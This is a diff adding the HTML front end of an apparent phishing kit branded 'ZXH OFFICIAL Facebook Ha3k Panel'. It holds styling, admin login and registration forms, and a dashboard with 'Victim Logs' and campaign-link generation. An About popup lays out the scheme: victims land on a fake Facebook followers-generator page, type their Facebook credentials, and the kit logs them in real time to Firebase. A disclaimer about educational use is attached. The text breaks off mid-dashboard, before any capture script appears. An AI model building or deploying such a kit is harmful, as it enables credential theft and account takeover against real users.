@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
+    <title>𝐙𝐗𝐇 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 | Facebook Ha3k Panel – Stealth Phishing & Real‑Time Logs</title>
+    <meta name="description" content="ZXH Official Facebook Ha3k Panel – Advanced stealth phishing tool with real‑time Firebase logs, clone pages, follower generator, and multi‑admin security.">
+    <meta name="keywords" content="Facebook hack, phishing panel, ZXH official, Facebook followers, real‑time logs, Firebase phishing, Zulqarnain X Haider, ethical hacking tool">
+    <meta name="author" content="Zulqarnain X Haider">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://zxh-official.com/">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://zxh-official.com/">
+    <meta property="og:title" content="𝐙𝐗𝐇 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 | Facebook Ha3k Panel">
+    <meta property="og:description" content="Advanced Facebook phishing panel with stealth mode, real‑time credential logging, and clone page technology.">
+    <meta property="og:image" content="https://i.ibb.co/xt5C8c7d/1000193609.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://zxh-official.com/">
+    <meta name="twitter:title" content="𝐙𝐗𝐇 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 | Facebook Ha3k Panel">
+    <meta name="twitter:description" content="Advanced Facebook phishing panel with stealth mode, real‑time credential logging, and clone page technology.">
+    <meta name="twitter:image" content="https://i.ibb.co/xt5C8c7d/1000193609.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js">
+    </script>
+    <style>
+        :root {
+            --bg: #e6e9ef;
+            --fb-blue: #1877f2;
+            --shadow-dark: #b8b6c3;
+            --shadow-light: #ffffff;
+            --sidebar-bg: #dde1e8;
+            --danger: #ef4444;
+            --success: #10b981;
+            --text: #2d3e50;
+            --text-light: #6b7c93;
+            --card-radius: 35px;
+            --btn-radius: 40px;
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text);
+            padding: 10px;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* Toast */
+        #toast {
+            position: fixed;
+            top: 15px;
+            right: -420px;
+            background: var(--bg);
+            padding: 14px 22px;
+            border-radius: 35px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 10px 10px 20px var(--shadow-dark), -5px -5px 15px var(--shadow-light);
+            z-index: 10001;
+            transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            min-width: 270px;
+            max-width: 92%;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        #toast.active {
+            right: 15px;
+        }
+        #toast .progress {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 4px;
+            width: 100%;
+            background: var(--fb-blue);
+            border-radius: 0 0 35px 35px;
+            transition: width 0.1s linear;
+        }
+        #toast i.close-toast {
+            cursor: pointer;
+            margin-left: auto;
+            opacity: 0.5;
+            font-size: 13px;
+            padding: 5px;
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .popup-3d {
+            background: var(--bg);
+            padding: 35px 25px;
+            border-radius: 40px;
+            text-align: center;
+            box-shadow: 20px 20px 60px var(--shadow-dark);
+            max-width: 380px;
+            width: 100%;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+        .popup-3d.wide-popup {
+            max-width: 550px;
+            text-align: left;
+            padding: 30px 28px;
+        }
+        .popup-3d.wide-popup h2 {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .popup-3d.wide-popup .about-content {
+            font-size: 13px;
+            line-height: 1.7;
+            color: var(--text);
+        }
+        .popup-3d.wide-popup .about-content h4 {
+            margin: 16px 0 6px;
+            color: var(--fb-blue);
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .popup-3d.wide-popup .about-content ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        .popup-3d.wide-popup .about-content ul li {
+            padding: 4px 0 4px 20px;
+            position: relative;
+        }
+        .popup-3d.wide-popup .about-content ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 0;
+            color: var(--fb-blue);
+            font-weight: 700;
+        }
+        .popup-3d.wide-popup .about-highlight {
+            background: rgba(24, 119, 242, 0.08);
+            border-radius: 20px;
+            padding: 14px 18px;
+            margin: 12px 0;
+            font-weight: 600;
+            font-size: 12px;
+            text-align: center;
+            color: var(--fb-blue);
+            letter-spacing: 0.3px;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.85); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Sidebar overlay */
+        .sidebar-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9996;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s ease;
+        }
+        .sidebar-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -310px;
+            width: 290px;
+            height: 100%;
+            background: var(--sidebar-bg);
+            z-index: 9997;
+            box-shadow: 8px 0 30px rgba(0, 0, 0, 0.2);
+            transition: left 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            flex-direction: column;
+            border-radius: 0 25px 25px 0;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 0;
+        }
+        .sidebar.active {
+            left: 0;
+        }
+        .sidebar-header {
+            padding: 20px 20px 15px;
+            text-align: center;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.08);
+            flex-shrink: 0;
+        }
+        .sidebar-header img {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 5px 5px 12px var(--shadow-dark), -3px -3px 8px var(--shadow-light);
+            margin-bottom: 8px;
+        }
+        .sidebar-header h4 {
+            font-size: 14px;
+            color: var(--text);
+            margin: 5px 0 0;
+            font-weight: 700;
+        }
+        .sidebar-header span {
+            font-size: 11px;
+            color: var(--text-light);
+        }
+        .sidebar-nav {
+            flex: 1;
+            padding: 10px 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .sidebar-nav .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 13px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--text);
+            transition: var(--transition);
+            text-decoration: none;
+            background: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            font-family: inherit;
+        }
+        .sidebar-nav .nav-item:hover,
+        .sidebar-nav .nav-item.active {
+            background: var(--bg);
+            box-shadow: inset 3px 3px 7px var(--shadow-dark), inset -3px -3px 7px var(--shadow-light);
+            color: var(--fb-blue);
+        }
+        .sidebar-nav .nav-item i {
+            width: 22px;
+            text-align: center;
+            font-size: 16px;
+        }
+        .sidebar-nav .divider {
+            height: 1px;
+            background: rgba(0, 0, 0, 0.08);
+            margin: 6px 8px;
+        }
+        .sidebar-nav .section-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--text-light);
+            padding: 8px 16px 4px;
+            font-weight: 700;
+        }
+        .sidebar-nav .about-tools {
+            font-size: 11px;
+            color: var(--text-light);
+            padding: 10px 16px;
+            background: rgba(0, 0, 0, 0.03);
+            border-radius: 15px;
+            margin: 4px 4px;
+            line-height: 1.4;
+            cursor: pointer;
+            transition: var(--transition);
+            border: none;
+            width: calc(100% - 8px);
+            text-align: left;
+            font-family: inherit;
+        }
+        .sidebar-nav .about-tools:hover {
+            background: rgba(24, 119, 242, 0.08);
+            color: var(--fb-blue);
+            box-shadow: inset 2px 2px 6px var(--shadow-dark), inset -2px -2px 6px var(--shadow-light);
+        }
+        .sidebar-footer {
+            padding: 12px 16px;
+            border-top: 1px solid rgba(0, 0, 0, 0.08);
+            flex-shrink: 0;
+            text-align: center;
+        }
+        .sidebar-footer .nav-item.logout-btn {
+            color: var(--danger);
+            justify-content: center;
+            font-weight: 700;
+            width: 100%;
+        }
+
+        /* Containers */
+        .container {
+            background: var(--bg);
+            padding: 28px 20px;
+            border-radius: var(--card-radius);
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 18px 18px 45px var(--shadow-dark), -18px -18px 45px var(--shadow-light);
+            margin: 12px 0;
+            animation: fadeInUp 0.5s ease;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(25px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .container.wide {
+            max-width: 960px;
+        }
+
+        /* Buttons */
+        .btn-3d {
+            background: var(--bg);
+            border: none;
+            padding: 13px 20px;
+            border-radius: var(--btn-radius);
+            box-shadow: 6px 6px 14px var(--shadow-dark), -6px -6px 14px var(--shadow-light);
+            cursor: pointer;
+            font-weight: 700;
+            color: #444;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: 0.2s;
+            font-size: 15px;
+            width: 100%;
+            margin: 5px 0;
+            font-family: inherit;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+        .btn-3d:active {
+            box-shadow: inset 5px 5px 10px var(--shadow-dark);
+            transform: scale(0.97);
+        }
+        .btn-3d.btn-sm {
+            width: auto;
+            padding: 10px 18px;
+            font-size: 13px;
+            border-radius: 30px;
+        }
+        .btn-fb {
+            background: var(--fb-blue);
+            color: white;
+            border: none;
+            box-shadow: 6px 6px 14px #a3b8d9, -6px -6px 14px #ffffff;
+        }
+        .btn-fb:active {
+            box-shadow: inset 4px 4px 10px rgba(0, 0, 0, 0.25);
+        }
+        .btn-wa {
+            background: #25d366;
+            color: white;
+            box-shadow: 6px 6px 14px #a3d9b5, -6px -6px 14px #ffffff;
+        }
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+            box-shadow: 6px 6px 14px #d9a3a3, -6px -6px 14px #ffffff;
+        }
+        .btn-close-popup {
+            background: var(--bg);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            box-shadow: 4px 4px 10px var(--shadow-dark), -4px -4px 10px var(--shadow-light);
+            cursor: pointer;
+            font-weight: 700;
+            font-family: inherit;
+            font-size: 14px;
+            margin-top: 12px;
+            transition: 0.2s;
+        }
+        .btn-close-popup:active {
+            box-shadow: inset 3px 3px 7px var(--shadow-dark);
+            transform: scale(0.96);
+        }
+
+        /* Inputs */
+        .input-group {
+            background: var(--bg);
+            border-radius: 50px;
+            padding: 5px 16px;
+            box-shadow: inset 6px 6px 14px var(--shadow-dark), inset -6px -6px 14px var(--shadow-light);
+            display: flex;
+            margin: 12px 0;
+            align-items: center;
+            transition: var(--transition);
+        }
+        .input-group:focus-within {
+            box-shadow: inset 4px 4px 10px var(--shadow-dark), inset -4px -4px 10px var(--shadow-light), 0 0 0 3px rgba(24, 119, 242, 0.15);
+        }
+        .input-group i {
+            margin-right: 10px;
+            color: var(--fb-blue);
+            font-size: 17px;
+            flex-shrink: 0;
+        }
+        input {
+            background: transparent;
+            border: none;
+            padding: 14px 0;
+            outline: none;
+            font-weight: 600;
+            width: 100%;
+            font-size: 15px;
+            color: var(--text);
+            font-family: inherit;
+        }
+        input::placeholder {
+            color: #a0aab4;
+            font-weight: 500;
+        }
+
+        /* Feature grid */
+        .features-grid {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 20px auto;
+            width: 100%;
+            max-width: 1000px;
+        }
+        .feature-box {
+            background: var(--bg);
+            padding: 25px 15px;
+            border-radius: 35px;
+            width: 100%;
+            max-width: 280px;
+            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
+            transition: 0.4s;
+            text-align: center;
+        }
+        .feature-box i {
+            font-size: 35px;
+            color: var(--fb-blue);
+            margin-bottom: 10px;
+        }
+        .feature-box h4 {
+            font-size: 14px;
+            font-weight: 700;
+            margin: 4px 0;
+        }
+        .feature-box p {
+            font-size: 12px;
+            color: var(--text-light);
+        }
+
+        /* Table */
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 15px 0;
+            border-radius: 25px;
+            -webkit-overflow-scrolling: touch;
+        }
+        .admin-table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0 8px;
+            min-width: 600px;
+        }
+        .admin-table th {
+            padding: 8px 10px;
+            opacity: 0.6;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+            font-weight: 700;
+        }
+        .admin-table td {
+            background: var(--bg);
+            padding: 14px 10px;
+            border-radius: 20px;
+            box-shadow: 4px 4px 10px var(--shadow-dark), -2px -2px 6px var(--shadow-light);
+            text-align: center;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .admin-table td b {
+            color: var(--fb-blue);
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .badge-active {
+            background: #d1fae5;
+            color: #065f46;
+        }
+        .badge-captured {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        /* Follower selector */
+        .follower-selector {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 18px 0;
+            flex-wrap: wrap;
+        }
+        .follower-option {
+            background: var(--bg);
+            padding: 11px 15px;
+            border-radius: 35px;
+            box-shadow: 5px 5px 10px var(--shadow-dark), -5px -5px 10px var(--shadow-light);
+            cursor: pointer;
+            font-weight: 700;
+            transition: 0.2s;
+            font-size: 15px;
+            flex: 1 0 auto;
+            min-width: 60px;
+            text-align: center;
+        }
+        .follower-option.selected {
+            background: var(--fb-blue);
+            color: white;
+            box-shadow: 0 0 20px rgba(24, 119, 242, 0.5);
+        }
+
+        /* Link display */
+        #linkDisplay {
+            margin-top: 18px;
+            padding: 18px;
+            background: #fff;
+            border-radius: 25px;
+            box-shadow: inset 4px 4px 10px #d1d5db;
+            word-break: break-all;
+            font-weight: 700;
+            color: var(--fb-blue);
+            font-size: 13px;
+            text-align: left;
+        }
+
+        /* Top bar */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 960px;
+            padding: 8px 15px;
+            margin-bottom: 5px;
+            gap: 10px;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-shrink: 0;
+        }
+        .logo-area img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 3px 3px 8px var(--shadow-dark), -3px -3px 8px var(--shadow-light);
+        }
+        .logo-area span {
+            font-weight: 800;
+            font-size: 16px;
+            color: var(--text);
+            letter-spacing: -0.5px;
+            white-space: nowrap;
+        }
+        .hamburger-btn {
+            background: var(--bg);
+            border: none;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            box-shadow: 5px 5px 12px var(--shadow-dark), -5px -5px 12px var(--shadow-light);
+            cursor: pointer;
+            font-size: 20px;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            flex-shrink: 0;
+            margin-left: auto;
+        }
+        .hamburger-btn:active {
+            box-shadow: inset 3px 3px 7px var(--shadow-dark);
+            transform: scale(0.95);
+        }
+        .admin-badge {
+            background: var(--bg);
+            padding: 8px 14px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: 700;
+            box-shadow: 3px 3px 8px var(--shadow-dark), -3px -3px 8px var(--shadow-light);
+            color: var(--fb-blue);
+            flex-shrink: 0;
+        }
+
+        /* Section headers */
+        .section-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--text-light);
+            margin: 20px 0 8px;
+            font-weight: 700;
+        }
+
+        /* History */
+        .history-panel {
+            max-height: 400px;
+            overflow-y: auto;
+            border-radius: 25px;
+            padding: 5px;
+        }
+        .history-item {
+            background: var(--bg);
+            padding: 14px 16px;
+            border-radius: 20px;
+            margin: 6px 0;
+            box-shadow: 3px 3px 8px var(--shadow-dark), -2px -2px 6px var(--shadow-light);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-size: 13px;
+            text-align: left;
+        }
+        .history-item .time {
+            font-size: 10px;
+            color: var(--text-light);
+            white-space: nowrap;
+        }
+
+        footer {
+            padding: 18px 10px;
+            color: #999;
+            text-align: center;
+            font-size: 11px;
+            width: 100%;
+            max-width: 960px;
+            margin-top: auto;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .victim-footer {
+            color: #999;
+            text-align: center;
+            font-size: 11px;
+            margin-top: 15px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 14px;
+                border-radius: 28px;
+            }
+            .btn-3d {
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+            .sidebar {
+                width: 270px;
+                left: -280px;
+            }
+            .sidebar.active {
+                left: 0;
+            }
+            .logo-area span {
+                font-size: 14px;
+            }
+            .admin-badge {
+                display: none;
+            }
+            .top-bar {
+                padding: 6px 10px;
+            }
+            .hamburger-btn {
+                width: 40px;
+                height: 40px;
+                font-size: 18px;
+            }
+            .admin-table {
+                min-width: 450px;
+            }
+            .admin-table td {
+                font-size: 11px;
+                padding: 10px 6px;
+            }
+            .features-grid {
+                flex-direction: column;
+                align-items: center;
+            }
+            .popup-3d.wide-popup {
+                max-width: 95vw;
+                padding: 22px 16px;
+                border-radius: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Toast -->
+    <div id="toast">
+        <div id="toast-icon"></div>
+        <div id="toast-msg"></div>
+        <i class="fas fa-times close-toast" onclick="hideToast()"></i>
+        <div class="progress" id="toast-progress"></div>
+    </div>
+
+    <!-- Sidebar overlay -->
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+
+    <!-- Sidebar -->
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <img src="https://i.ibb.co/xt5C8c7d/1000193609.jpg" alt="ZXH Logo" id="sidebarLogo">
+            <h4>𝐙𝐗𝐇 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋</h4>
+            <span id="sidebarUsername">Admin Panel</span>
+        </div>
+        <div class="sidebar-nav">
+            <button class="nav-item active" onclick="navigateTo('dashboard')"><i class="fas fa-th-large"></i> Dashboard</button>
+            <button class="nav-item" onclick="navigateTo('generate')"><i class="fas fa-plus-circle"></i> Generate Campaign</button>
+            <button class="nav-item" onclick="navigateTo('logs')"><i class="fas fa-list-alt"></i> Victim Logs</button>
+            <div class="divider"></div>
+            <div class="section-label">📱 Contacts & Links</div>
+            <a class="nav-item" href="https://whatsapp.com/channel/0029Vb6lszR7YSd3iYfa2V0" target="_blank" rel="noopener"><i class="fab fa-whatsapp" style="color:#25d366;"></i> WhatsApp Channel</a>
+            <a class="nav-item" href="https://wa.me/923000000000" target="_blank" rel="noopener"><i class="fab fa-whatsapp" style="color:#25d366;"></i> WhatsApp Contact</a>
+            <a class="nav-item" href="https://chat.whatsapp.com/examplegroup" target="_blank" rel="noopener"><i class="fas fa-users" style="color:#25d366;"></i> WhatsApp Group</a>
+            <a class="nav-item" href="https://t.me/zxh_official" target="_blank" rel="noopener"><i class="fab fa-telegram" style="color:#0088cc;"></i> Owner Contact</a>
+            <div class="divider"></div>
+            <div class="section-label">🛠️ Tools & Resources</div>
+            <a class="nav-item" href="#" onclick="showToast('More tools coming soon!','info')"><i class="fas fa-tools"></i> More Tools</a>
+            <a class="nav-item" href="#" onclick="showToast('Hack websites section coming!','info')"><i class="fas fa-globe"></i> Other Hack Websites</a>
+            <button class="about-tools" onclick="openAboutPopup()" title="Click for full details">
+                <strong>📖 About ZXH Panel</strong><br>
+                <small style="opacity:0.7;">Tap to read full description & features</small>
+            </button>
+        </div>
+        <div class="sidebar-footer">
+            <button class="nav-item logout-btn" onclick="handleLogout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+    </div>
+
+    <!-- WhatsApp popup (admin only) -->
+    <div class="overlay" id="waPopup" style="display:none;">
+        <div class="popup-3d">
+            <div style="font-size:50px;color:#25d366;margin-bottom:12px;"><i class="fab fa-whatsapp"></i></div>
+            <h2 style="margin-bottom:8px;">Join WhatsApp Channel</h2>
+            <p style="margin-bottom:18px;font-size:13px;color:#666;">Get exclusive hacking tools, updates & methods.</p>
+            <button class="btn-3d btn-wa" onclick="window.open('https://whatsapp.com/channel/0029Vb6lszR7YSd3iYfa2V0','_blank')">
+                <i class="fab fa-whatsapp"></i> Join Channel
+            </button>
+            <button class="btn-close-popup" onclick="closeWaPopup()" style="margin-top:10px;">I Have Joined ✓</button>
+        </div>
+    </div>
+
+    <!-- About popup -->
+    <div class="overlay" id="aboutPopup" style="display:none;">
+        <div class="popup-3d wide-popup">
+            <div style="font-size:40px;color:var(--fb-blue);margin-bottom:8px;text-align:center;"><i class="fas fa-info-circle"></i></div>
+            <h2>📖 About ZXH Official Panel</h2>
+            <div class="about-content">
+                <div class="about-highlight">
+                    🚀 <strong>ZXH OFFICIAL</strong> — The Ultimate Facebook Ha3k Panel powered by <strong>Zulqarnain X Haider</strong>
+                </div>
+                <h4>🔍 What is ZXH Panel?</h4>
+                <p>ZXH Official is an advanced <strong>Facebook phishing & security testing panel</strong> designed for educational and research purposes. It allows security researchers to understand how phishing attacks work in real-time using Firebase-powered live logging.</p>
+
+                <h4>⚡ Core Features</h4>
+                <ul>
+                    <li><strong>Stealth Phishing Mode:</strong> Undetectable phishing layer that mimics Facebook's official login page with high accuracy — including neumorphic UI design that looks completely legitimate.</li>
+                    <li><strong>Real-Time Firebase Logs:</strong> Captured credentials appear instantly in the admin dashboard via Firebase Realtime Database integration. No delay, no refresh needed.</li>
+                    <li><strong>Clone Page Technology:</strong> High-quality Facebook lookalike page with follower generator theme — victims believe they are getting free followers.</li>
+                    <li><strong>Campaign Generation:</strong> Generate unique phishing session links tied to your admin account. Each campaign is tracked separately.</li>
+                    <li><strong>Victim Logs & History:</strong> Complete history of all captured data including emails, passwords, follower counts, and timestamps.</li>
+                    <li><strong>Multi-Admin Support:</strong> Register multiple admin accounts with secure password hashing and recovery key system.</li>
+                </ul>
+
+                <h4>🛡️ Security & Encryption</h4>
+                <ul>
+                    <li>Passwords are hashed using <strong>SHA-256 + custom salt</strong> before storage</li>
+                    <li>Recovery key system for secure password resets</li>
+                    <li>Session-based authentication with expiry</li>
+                    <li>Firebase Realtime Database with restricted access rules</li>
+                </ul>
+
+                <h4>📊 How It Works</h4>
+                <ul>
+                    <li><strong>Step 1:</strong> Admin generates a unique campaign link from the dashboard</li>
+                    <li><strong>Step 2:</strong> Victim clicks the link and sees a "Facebook Followers Generator 2026" page</li>
+                    <li><strong>Step 3:</strong> Victim enters their Facebook credentials to "verify" their account</li>
+                    <li><strong>Step 4:</strong> Credentials are captured and displayed in real-time on the admin panel</li>
+                    <li><strong>Step 5:</strong> Victim is redirected to the official WhatsApp channel</li>
+                </ul>
+
+                <h4>👤 Owner & Credits</h4>
+                <ul>
+                    <li><strong>Developed by:</strong> Zulqarnain X Haider</li>
+                    <li><strong>Panel Name:</strong> ZXH OFFICIAL Facebook Ha3k Panel</li>
+                    <li><strong>Version:</strong> 3.0 (2026 Edition)</li>
+                    <li><strong>Tech Stack:</strong> Firebase Realtime DB, Vanilla JavaScript, Neumorphic CSS3</li>
+                </ul>
+
+                <div class="about-highlight" style="margin-top:16px;">
+                    ⚠️ <strong>Disclaimer:</strong> This panel is intended for <strong>educational & security research purposes only</strong>. The developer is not responsible for any misuse. Always obtain proper authorization before testing.
+                </div>
+            </div>
+            <button class="btn-close-popup" onclick="closeAboutPopup()" style="margin-top:16px;width:100%;">
+                <i class="fas fa-times"></i> Close
+            </button>
+        </div>
+    </div>
+
+    <!-- AUTH CONTAINER (login/register/forgot) -->
+    <div id="auth-container" class="container" style="display:none;max-width:420px;margin-top:30px;">
+        <!-- Login form -->
+        <div id="login-form">
+            <div style="font-size:45px;color:var(--fb-blue);margin-bottom:5px;"><i class="fab fa-facebook"></i></div>
+            <h2 style="font-size:20px;margin-bottom:5px;">Admin Login</h2>
+            <p style="font-size:12px;color:var(--text-light);margin-bottom:15px;">Sign in to your panel</p>
+            <div class="input-group"><i class="fas fa-user"></i><input type="text" id="loginUsername" placeholder="Username"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="loginPassword" placeholder="Password"></div>
+            <button class="btn-3d btn-fb" onclick="handleLogin()"><i class="fas fa-sign-in-alt"></i> Login</button>
+            <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap;justify-content:center;">
+                <button class="btn-3d btn-sm" onclick="showAuthView('register')">Create Account</button>
+                <button class="btn-3d btn-sm" onclick="showAuthView('forgot')">Forgot Password?</button>
+            </div>
+        </div>
+        <!-- Register form -->
+        <div id="register-form" style="display:none;">
+            <div style="font-size:40px;color:var(--fb-blue);margin-bottom:5px;"><i class="fas fa-user-plus"></i></div>
+            <h2 style="font-size:20px;margin-bottom:5px;">Register Admin</h2>
+            <p style="font-size:12px;color:var(--text-light);margin-bottom:10px;">Create your admin account</p>
+            <div class="input-group"><i class="fas fa-user"></i><input type="text" id="regUsername" placeholder="Username"></div>
+            <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="regEmail" placeholder="Email Address"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="regPassword" placeholder="Password"></div>
+            <div class="input-group"><i class="fas fa-key"></i><input type="text" id="regRecoveryKey" placeholder="Recovery Key (for password reset)"></div>
+            <button class="btn-3d btn-fb" onclick="handleRegister()"><i class="fas fa-check-circle"></i> Register</button>
+            <button class="btn-3d btn-sm" onclick="showAuthView('login')" style="margin-top:8px;">← Back to Login</button>
+        </div>
+        <!-- Forgot password form -->
+        <div id="forgot-form" style="display:none;">
+            <div style="font-size:40px;color:var(--danger);margin-bottom:5px;"><i class="fas fa-unlock-alt"></i></div>
+            <h2 style="font-size:20px;margin-bottom:5px;">Reset Password</h2>
+            <p style="font-size:12px;color:var(--text-light);margin-bottom:10px;">Verify your identity to reset</p>
+            <div class="input-group"><i class="fas fa-user"></i><input type="text" id="forgotUsername" placeholder="Username"></div>
+            <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="forgotEmail" placeholder="Registered Email"></div>
+            <div class="input-group"><i class="fas fa-key"></i><input type="text" id="forgotRecoveryKey" placeholder="Recovery Key"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="forgotNewPassword" placeholder="New Password"></div>
+            <button class="btn-3d btn-danger" onclick="handleForgotPassword()"><i class="fas fa-sync-alt"></i> Reset Password</button>
+            <button class="btn-3d btn-sm" onclick="showAuthView('login')" style="margin-top:8px;">← Back to Login</button>
+        </div>
+    </div>
+
+    <!-- DASHBOARD CONTAINER -->
+    <div id="dashboard-container" style="display:none;width:100%;max-width:960px;flex-direction:column;align-items:center;">
+        <!-- Top bar -->
+        <div class="top-bar">
+            <div class="logo-area">
+                <img src="https://i.ibb.co/xt5C8c7d/1000193609.jpg" alt="Logo" id="topbarLogo">
+                <span>𝐙𝐗𝐇 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋</span>
+            </div>
+            <span class="admin-badge" id="adminBadgeDesktop">🟢 Admin</span>
+            <button class="hamburger-btn" onclick="toggleSidebar()" aria-label="Menu">☰</button>
+        </div>
+
+        <!-- Main dashboard card -->
+        <div class="container wide" id="admin-card">
+            <h1 style="font-size:22px;margin-bottom:12px;">
+                <i class="fab fa-facebook" style="color:var(--fb-blue);"></i> Facebook Ha3k Panel
+            </h1>
+            <p style="font-size:13px;color:var(--text-light);margin-bottom:5px;">Welcome, <b id="dashUsername">Admin</b></p>
+
+            <!-- Generate campaign -->
+            <div id="section-generate">
+                <button class="btn-3d btn-fb" onclick="generateSessionLink()">
+                    <i class="fas fa-plus-circle"></i> Generate New Campaign
+                </button>
+                <div id="linkDisplay" style="display:none;">
+                    <p id="actualLink" style="margin-bottom:10px;"></p>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                        <button class="btn-3d btn-sm" onclick="copyLink()" style="flex:1;"><i class="fas fa-copy"></i> Copy</button>
